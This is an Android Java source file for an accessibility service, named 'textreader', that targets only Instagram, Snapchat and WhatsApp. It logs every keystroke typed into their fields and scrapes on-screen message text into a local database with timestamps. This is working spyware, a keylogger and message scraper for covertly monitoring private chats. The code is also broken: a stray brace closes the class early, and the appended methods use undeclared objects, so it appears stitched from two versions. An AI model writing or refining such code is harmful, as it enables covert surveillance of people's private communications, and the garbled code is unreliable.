package com.example.textreader;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;

public class GlobalActionBarService extends AccessibilityService {

    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
    private DBHelper dbHelper;

    // Blacklist of UI junk words we ignore
    private Set<String> uiJunk = new HashSet<String>() {{
        add("Send");
        add("Message");
        add("Back");
        add("More");
        add("Profile");
        add("Delete");
        add("Copy");
        add("Reply");
        add("Forward");
        add("Settings");
        add("Search");
        add("Type a message");
        add("New message");
        add("Seen");
        add("Delivered");
        add("Read");
        add("Like");
        add("Comment");
        add("Share");
        add("Save");
        add("Cancel");
        add("Done");
        add("Edit");
        add("Post");
        add("Story");
        add("Home");
        add("Explore");
        add("Activity");
        add("Notifications");
        add("Direct");
        add("Inbox");
        add("Create");
        add("View");
        add("Reply");
        add("Forward");
        add("Delete");
        add("More");
        add("Options");
        add("Menu");
        add("Add");
        add("Remove");
        add("Block");
        add("Report");
        add("Unfollow");
        add("Follow");
        add("Mute");
        add("Hide");
    }};

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        dbHelper = new DBHelper(this);

        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();

        // Target only Instagram, Snapchat, and WhatsApp
        if (!pkg.equals("com.instagram.android") &&
            !pkg.equals("com.snapchat.android") &&
            !pkg.equals("com.whatsapp")) {
            return;
        }

        // --- 1. KEYBOARD INPUT (typing in real-time) ---
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.isEditable()) {
                String typed = source.getText() != null ? source.getText().toString() : "";
                if (!typed.isEmpty()) {
                    String log = String.format("[%s] APP: %s [KEYBOARD]: %s",
                            dateFormat.format(new Date()),
                            getAppName(pkg),
                            typed);
                    dbHelper.insertData(log);
                }
            }
        }

        // --- 2. SCREEN TEXT (actual messages, filter junk) ---
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                String extracted = extractCleanText(root);
                if (!extracted.isEmpty()) {
                    String log = String.format("[%s] APP: %s [MESSAGE]: %s",
                            dateFormat.format(new Date()),
                            getAppName(pkg),
                            extracted);
                    dbHelper.insertData(log);
                }
            }
        }
    }

    private String extractCleanText(AccessibilityNodeInfo node) {
        StringBuilder sb = new StringBuilder();
        collectText(node, sb);
        String raw = sb.toString();

        // Split and filter
        String[] parts = raw.split("\\|");
        StringBuilder filtered = new StringBuilder();
        for (String part : parts) {
            part = part.trim();
            // Keep only text longer than 10 chars AND not in the UI junk list
            if (part.length() > 10 && !uiJunk.contains(part) && !containsJunk(part)) {
                if (filtered.length() > 0) filtered.append(" | ");
                filtered.append(part);
            }
        }

        // Limit to 2000 chars
        String result = filtered.toString();
        if (result.length() > 2000) {
            result = result.substring(0, 2000);
        }
        return result;
    }

    private void collectText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString();
            if (!text.isEmpty()) {
                if (sb.length() > 0) sb.append("|");
                sb.append(text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectText(child, sb);
            }
        }
    }

    // Extra filter to catch phrases that contain UI junk (e.g., "Send message to John")
    private boolean containsJunk(String text) {
        for (String junk : uiJunk) {
            if (text.contains(junk)) return true;
        }
        return false;
    }

    private String getAppName(String pkg) {
        if (pkg.equals("com.instagram.android")) return "INSTAGRAM";
        if (pkg.equals("com.snapchat.android")) return "SNAPCHAT";
        if (pkg.equals("com.whatsapp")) return "WHATSAPP";
        return pkg;
    }

    @Override
    public void onInterrupt() {
        // Do nothing
    }
    }    @Override
    protected void onServiceConnected() {

        System.out.println("onService Connected");
        Toast.makeText(this, "this package name is "+this.getPackageName(), Toast.LENGTH_SHORT).show();
        AccessibilityServiceInfo info=new AccessibilityServiceInfo();
        info.eventTypes=AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.eventTypes=AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType=AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.notificationTimeout=1000;
        info.packageNames=new String[]{"com.whatsapp","com.instagram.android"};
        setServiceInfo(info);

    }
    public void printEverything(AccessibilityNodeInfo node, int depth) {
        if (node == null) return;
        String print = "";
        for (int i = 0; i < depth; i++) print += "\t";
        if(node.getViewIdResourceName()!=null)
            print += "Name/Message:" + node.getViewIdResourceName();
        if(node.getText()!=null) {
            print += " ";
            print += "Name/Message:" + node.getText();
            Log.i("TESTREQ", print);
            if(node.getPackageName().equals("com.whatsapp"))
                db.insertData(print);

            if(node.getPackageName().equals("com.instagram.android"))
                dbi.insertData(print);

        }

        for (int j = 0; j < node.getChildCount(); j++) {
            printEverything(node.getChild(j), depth + 1);
        }
    }
}
